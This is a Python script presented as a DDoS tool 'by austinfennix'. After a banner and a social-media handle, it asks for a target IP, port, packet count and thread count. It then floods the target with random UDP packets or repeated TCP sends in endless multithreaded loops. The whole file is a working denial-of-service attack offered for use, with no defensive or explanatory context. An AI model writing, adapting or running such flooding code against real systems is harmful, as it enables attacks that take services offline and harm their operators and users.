#!/usr/bin/env python3
#Ddos by austinfennix
import random
import socket
import threading
import os

os.system("clear")
print("4444444444  44   44  4444444    44     44  444    44       44")
print("44      44  44   44 4           44     44  44 4   44         ")
print("4444444444  44   44  .44444.    44     44  44 44  44       44")
print("44      44  44   44         4   44     44  44  44 44       44")
print("44      44  4444444  444444'    44     44  44    .44       44")  
print("_____________________________________________________________")
print("Follow my Instagram : @tdyfnnx_")
print("-Dont Abuse or i share your ip-")
print(" TOOLS BY AUSTIN FENNIX! ")
print("_____________________________________________________________")
ip = str(input(" DDoSAttackByAustin | Ip:"))
port = int(input(" DDoSAttackByAustin | Port:"))
choice = str(input(" DDoSAttackByAustin | Gas Gak Ni?(y/n):"))
times = int(input(" DDoSAttackByAustin | Packets:"))
threads = int(input(" DDoSAttackByAustin | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | Attack |")
		except:
			print("[!] | Austin Is Here |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Austin nih bos!!!")
		except:
			s.close()
			print("[*] Austin Is Here")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
